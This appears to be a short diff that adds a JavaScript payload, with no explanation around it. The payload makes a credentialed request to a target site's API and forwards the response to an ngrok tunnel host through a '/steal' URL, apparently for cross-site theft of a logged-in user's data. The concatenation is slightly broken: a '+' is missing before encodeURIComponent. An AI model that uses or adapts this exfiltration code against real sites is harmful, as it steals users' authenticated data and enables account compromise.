@@ -1,0 +1,2 @@
+"hello"
+fetch("https://target.com/api/v1/data", {method: "GET",credentials: "include"}).then(response => response.text()).then(data => {fetch("https://02eb-49-207-213-92.ngrok-free.app/steal?data="   encodeURIComponent(data));});
